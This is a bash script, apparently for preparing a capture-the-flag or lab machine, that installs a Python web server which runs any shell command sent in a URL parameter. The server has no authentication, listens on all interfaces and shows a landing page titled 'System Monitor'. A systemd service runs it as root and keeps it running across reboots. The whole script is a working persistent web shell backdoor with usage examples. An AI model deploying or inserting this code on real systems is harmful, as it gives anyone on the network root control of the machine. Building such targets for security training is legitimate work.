#!/bin/bash

echo "=========================================="
echo "  Setting up RCE Entry Point"
echo "=========================================="
echo ""

# Install Python if not already installed
if ! command -v python3 &> /dev/null; then
    echo "Installing Python3..."
    sudo apt update
    sudo apt install -y python3
fi

# Create RCE server script
echo "Creating RCE entry point server..."
cat > /tmp/rce_server.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import subprocess
import sys

class RCEHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suppress default logging
        pass
    
    def do_GET(self):
        if self.path.startswith('/execute?'):
            # Parse command from query string
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            cmd = params.get('cmd', [''])[0]
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            if cmd:
                try:
                    # Execute command with timeout
                    result = subprocess.check_output(
                        cmd, 
                        shell=True, 
                        stderr=subprocess.STDOUT, 
                        timeout=10
                    )
                    self.wfile.write(result)
                except subprocess.TimeoutExpired:
                    self.wfile.write(b'Command timeout')
                except Exception as e:
                    self.wfile.write(str(e).encode())
            else:
                self.wfile.write(b'Usage: /execute?cmd=<command>')
        else:
            # Default page with instructions
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'''
<!DOCTYPE html>
<html>
<head>
    <title>System Monitor</title>
    <style>
        body { font-family: Arial; margin: 40px; }
        code { background: #f4f4f4; padding: 2px 6px; border-radius: 3px; }
        a { color: #0066cc; }
    </style>
</head>
<body>
    <h1>System Monitor</h1>
    <p>Execute system commands via GET request:</p>
    <p><code>/execute?cmd=&lt;command&gt;</code></p>
    <h2>Examples:</h2>
    <ul>
        <li><a href="/execute?cmd=whoami">/execute?cmd=whoami</a></li>
        <li><a href="/execute?cmd=id">/execute?cmd=id</a></li>
        <li><a href="/execute?cmd=hostname">/execute?cmd=hostname</a></li>
    </ul>
</body>
</html>
            ''')

if __name__ == '__main__':
    PORT = 8080
    server = HTTPServer(('0.0.0.0', PORT), RCEHandler)
    print(f'[*] RCE Entry Point listening on 0.0.0.0:{PORT}')
    print(f'[*] Access via: http://<ip>:{PORT}/execute?cmd=<command>')
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\n[*] Shutting down...')
        server.shutdown()
EOF

chmod +x /tmp/rce_server.py

# Create systemd service
echo "Creating systemd service..."
sudo bash -c 'cat > /etc/systemd/system/rce-entry.service << EOF
[Unit]
Description=RCE Entry Point Server
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /tmp/rce_server.py
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF'

# Reload systemd and start service
echo "Starting RCE entry point service..."
sudo systemctl daemon-reload
sudo systemctl enable rce-entry.service
sudo systemctl start rce-entry.service

# Check if service started
sleep 2
if sudo systemctl is-active --quiet rce-entry.service; then
    echo "[✓] RCE entry point service is running"
else
    echo "[✗] RCE entry point service failed to start"
    echo "Check logs with: sudo journalctl -u rce-entry.service"
fi

# Display connection info
echo ""
echo "=========================================="
echo "  RCE Entry Point Ready!"
echo "=========================================="
echo ""
IP=$(hostname -I | awk '{print $1}')
echo "RCE Entry Point:"
echo "  http://${IP}:8080/execute?cmd=whoami"
echo "  curl \"http://${IP}:8080/execute?cmd=id\""
echo ""
echo "SCADA Terminal (if Docker challenge is running):"
echo "  nc ${IP} 9001"
echo ""
echo "Service management:"
echo "  sudo systemctl status rce-entry.service"
echo "  sudo systemctl stop rce-entry.service"
echo "  sudo systemctl start rce-entry.service"
echo ""

